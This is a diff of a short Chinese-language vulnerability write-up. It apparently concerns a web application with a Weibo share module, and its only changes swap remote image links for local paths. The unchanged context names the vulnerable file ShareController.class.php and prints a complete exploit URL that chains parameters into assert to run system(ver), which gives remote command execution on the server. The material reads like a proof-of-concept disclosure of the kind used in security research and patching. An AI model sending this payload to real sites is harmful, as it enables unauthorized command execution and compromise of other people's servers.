@@ -20,11 +20,11 @@ icon_hash="1167011145"
 
 登录页面如下
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170923817.png)
+![](./images/202202170923817.png)
 
 存在漏洞的文件 `Application/Weibo/Controller/ShareController.class.php`
 
-![image-20220518154015894](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181540972.png)
+![image-20220518154015894](./images/202205181540972.png)
 
 发送Payload
 
@@ -32,4 +32,4 @@ icon_hash="1167011145"
 /index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170923310.png)
+![](./images/202202170923310.png)
